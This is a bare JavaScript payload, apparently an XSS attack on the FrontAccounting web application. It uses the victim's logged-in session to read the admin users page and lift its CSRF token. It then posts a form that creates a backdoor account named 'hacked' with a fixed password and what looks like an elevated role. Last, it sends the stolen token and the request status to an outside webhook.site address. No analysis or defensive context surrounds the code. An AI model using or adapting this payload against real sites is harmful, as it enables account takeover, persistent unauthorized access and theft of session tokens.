var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.withCredentials = true;
r.send();

var raw = r.responseText;
var m = raw.match(/name="_token" value="([^"]+)"/);
var token = m ? m[1] : '';

var body = 'user_id=hacked' +
           '&password=hacked123' +
           '&real_name=hacked' +
           '&phone=' +
           '&email=' +
           '&role_id=2' +
           '&language=C' +
           '&pos=1' +
           '&print_profile=' +
           '&rep_popup=1' +
           '&ADD_ITEM=Add+new' +
           '&_focus=user_id' +
           '&_modified=0' +
           '&_confirmed=' +
           '&_token=' + encodeURIComponent(token);

var r2 = new XMLHttpRequest();
r2.open('POST', '/frontaccounting/admin/users.php', false);
r2.withCredentials = true;
r2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
r2.send(body);

new Image().src = '	https://webhook.site/33576a95-7734-4cc6-8e96-4b33a3f0793d/?token=' + encodeURIComponent(token) + '&post=' + r2.status;
